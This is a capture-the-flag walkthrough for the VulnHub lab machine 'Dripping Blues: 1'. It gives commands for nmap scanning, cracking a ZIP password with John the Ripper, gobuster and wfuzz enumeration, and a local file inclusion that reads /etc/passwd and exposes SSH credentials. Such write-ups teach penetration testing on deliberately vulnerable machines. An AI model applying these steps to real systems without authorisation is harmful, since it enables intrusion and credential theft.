# Dripping Blues: 1

## Machine Information

- **Machine:** Dripping Blues: 1
- **Platform:** VulnHub
- **Download:** https://www.vulnhub.com/entry/dripping-blues-1,744/

---

# Network Scanning

## Find Target IP

Scan the local network to identify the target machine.

```bash
nmap -sn 192.168.2.0/24
```

![](images/4-2.png)

---

## Full Nmap Scan

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.123
```

![](images/4-3.png)

---

## Scan All TCP Ports (Optional)

```bash
nmap -v -p- 192.168.2.123
```

---

## Aggressive Scan

```bash
nmap -sC -sV -A 192.168.2.123
```

This scan performs:

- Service detection
- Version detection
- OS detection
- Default NSE scripts

---

## HTTP Enumeration

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.123
```

![](images/4-4.png)

---

# FTP Enumeration

## Connect to FTP

```bash
ftp 192.168.2.123
```

---

## List Files

```bash
ls
```

---

## Download ZIP File

```bash
get respectmydrip.zip
```

![](images/4-5.png)

---

## Extract ZIP Archive

```bash
unzip respectmydrip.zip
```

Password is required.

![](images/4-6.png)

---

## Crack ZIP Password

Generate the password hash.

```bash
zip2john respectmydrip.zip > hash.txt
```

![](images/4-7.png)

Crack the hash using John the Ripper.

```bash
john hash.txt --wordlist=/opt/rockyou.txt
```

![](images/4-8.png)

---

## Extract the Archive Again

```bash
unzip respectmydrip.zip
```

Read the extracted file.

```bash
cat respectmydrip.txt
```

![](images/4-9.png)

---

# Web Enumeration

Visit:

```
http://192.168.2.123/
http://192.168.2.123/robots.txt
http://192.168.2.123/dripisreal.txt
```

![](images/4-10.png)

---

## Directory Bruteforce

```bash
gobuster dir \
-u http://192.168.2.123 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html \
-t 50
```

![](images/4-11.png)

---

## Local File Inclusion (LFI)

Browse to:

```
http://192.168.2.123/index.php
```

Identify the vulnerable parameter.

```bash
wfuzz -u 'http://192.168.2.123/index.php?FUZZ=/etc/passwd' \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
--hw 21
```

![](images/4-12.png)

Test the parameter.

```
http://192.168.2.123/index.php?drip=/etc/passwd
```

![](images/4-13.png)

Load the file referenced in `robots.txt`.

```
http://192.168.2.123/index.php?drip=/etc/dripispowerful.html
```

![](images/4-14.png)

View the page source.

```text
view-source:http://192.168.2.123/index.php?drip=/etc/dripispowerful.html
```

![](images/4-15.png)

---

## Credentials Discovered

Password:

```text
imdrippinbiatch
```

Possible usernames:

```text
travisscott
thugger
```

---

# SSH Access

Connect via SSH.

```bash
ssh thugger@192.168.2.123
```

![](images/4-16.png)